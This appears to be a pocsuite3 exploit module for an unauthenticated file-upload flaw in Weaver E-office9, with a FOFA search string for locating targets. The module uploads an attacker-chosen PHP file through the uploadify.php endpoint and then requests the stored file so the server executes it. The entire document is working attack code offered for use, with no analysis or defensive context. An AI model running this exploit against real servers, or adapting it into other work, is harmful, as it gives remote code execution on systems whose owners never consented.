from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = '泛微E-office9文件上传'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': 'app="泛微-EOffice"'}

    def _exploit(self, param=''):
        vuln_path = '/inc/jquery/uploadify/uploadify.php'
        url = urljoin(self.url, vuln_path)
        header = {
            'Content-Type': 'multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85'}
        data = f'''
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: application/octet-stream

{param}

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream

--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
        '''
        res = requests.post(url, verify=False, timeout=5, data=data, headers=header)
        up_path = res.text
        up_path = f'/attachment/{up_path}/test.php'
        result_path = urljoin(self.url, up_path)
        res_up = requests.get(result_path)
        return res_up.text

    def _verify(self):
        result = {}
        flag = random_str(6)
        param = f'echo "{flag}";'
        res = self._exploit(param)
        if flag in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['flag'] = param
        return self.parse_output(result)


register_poc(POC)
